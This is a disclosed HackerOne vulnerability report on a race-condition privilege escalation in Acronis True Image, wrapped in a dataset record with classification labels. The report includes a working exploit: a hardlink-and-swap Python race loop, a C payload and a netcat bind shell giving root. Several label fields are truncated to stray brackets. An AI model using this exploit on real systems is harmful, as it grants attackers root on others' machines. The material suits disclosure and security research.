{
  "reported_to": "Acronis",
  "reported_by": "vkas-afk ",
  "title": "Acronis True Image Local Privilege Escalation Due To Race Condition In Application Verification ",
  "content": "\nSummary\nThe Acronis True Image application has a SUID binary \"Acronis True Image\" that starts another binary \"console\" in the same directory. The SUID binary does some checks on \"console\" before it is run to make sure the correct binary is being run. By using a hardlink to the SUID binary we can coerice it to try and load \"console\" in a chosen directory we can write to. From this point we can exploit that the SUID binary does not lock \"console\" whilst it checks if it is valid, we setup a environment where we can replace console at will and try to win a race where we replace the \"console\" binary after it has been checked but before it has been run. If we win this race we gain code execution as root from an admin account.\nSteps To Reproduce\nfirst we make the shell command to run\nCode 88 Bytes\n1echo \"mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1\" > shell \nnow lets make the c program that will run this shell command naming it test.c\nCode 80 Bytes\n1#include <stdlib.h>\n2int main() \n3{\n4\tsystem(\"touch pass;bash shell\");\n5\treturn 0;\n6}\ncompile the program\nCode 11 Bytes\n1gcc test.c \nrun the following python program\nCode 496 Bytes\n1import os \n2import time \n3\n4os.link(\"/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image\", \"./run\")\n5os.link(\"/Applications/Acronis True Image.app/Contents/MacOS/console\", \"./console\")\n6\n7lag = 0.01 \n8while True: \n9\tos.popen(\"./run\")\n10\ttime.sleep(lag)\n11\tos.unlink(\"./console\")\n12\tos.link(\"./a.out\", \"./console\")\n13\ttime.sleep(1.0)\n14\tos.unlink(\"./console\")\n15\tos.link(\"Applications/Acronis True Image.app/Contents/MacOS/console\", \"./console\")\n16\tlag += 0.01 \n17\tif os.path.exists(\"./pass\"):\n18\t\texit()\nconnect to the root shell\nCode 17 Bytes\n1nc 127.0.0.1 8080\nRecommendations\nAny binaries that are checked for validity should be locked so that they can not be replaced during validation. Additionally if possible the application should verify where it is being run from to try and prevent further symlink attacks.\nImpact\nLocal privilege escalation to root.\n\n",
  "severity": "[",
  "bounty": null,
  "weaknesses": "[",
  "screenshots": {},
  "disclosed_date": 1659018720,
  "report_url": "https://hackerone.com/reports/1251464",
  "is_multi_component": false,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": "[",
  "vuln_description": "The vulnerability is a local privilege escalation in Acronis True Image due to a race condition in application verification. The SUID binary 'Acronis True Image' starts another binary 'console' after performing checks, but does not lock the 'console' binary during validation. By exploiting a race condition where 'console' is replaced after validation but before execution, an attacker can execute arbitrary code as root.",
  "reason": "This vulnerability involves multiple components (shell script, C program, Python exploit script) and requires understanding of race conditions, SUID binaries, and file system manipulation. The attack requires precise timing to win the race condition, making it non-trivial to discover and exploit. However, the concept of race conditions in SUID binaries is a known attack vector.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": false,
  "injection_classification": "}"
}